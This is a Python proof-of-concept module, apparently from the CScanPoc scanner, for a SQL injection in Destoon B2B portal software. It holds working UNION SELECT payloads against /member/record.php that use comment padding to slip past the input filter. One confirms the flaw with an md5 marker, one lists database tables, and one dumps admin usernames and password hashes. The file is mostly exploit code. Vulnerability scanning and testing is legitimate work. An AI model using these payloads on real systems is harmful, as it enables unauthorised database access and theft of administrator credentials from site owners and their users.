# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Destoon_0002_p'  # 平台漏洞编号，留空
    name = 'Destoon SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-10-01'  # 漏洞公布时间
    desc = '''
        Destoon B2B网站管理系统是一套完善的B2B（电子商务）行业门户解决方案。
        在include/global.func.php 中strip_sql函数对传进来的值进行了过滤，但是我们可以绕过该限制，达到全版本注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/764/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Destoon'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '314c6767-b0e2-4515-84b7-e2dba95d0615'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际情况payload路径可能不同
            payload = '/member/record.php'
            data1 = '?action=pay&mid=-1+union//***/select//***/1,2,md5(c),username,5,6,7,8,9 from destoon_member where admin=1-- a'
            data2 = '?action=pay&mid=-1+union//***/select//***/1,2,GROUP_CONCAT(DISTINCT+table_name),4,5,6,7,8,9+from+information_schema.columns+where+table_schema=database()--%20a'
            data3 = '?action=pay&mid=-1+union//***/select//***/1,2,concat(username,0x3A,password),4,5,6,7,8,9%20from%20destoon_member%20where%20admin=1--%20a'
            url = self.target + payload + data1
            r = requests.get(url)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
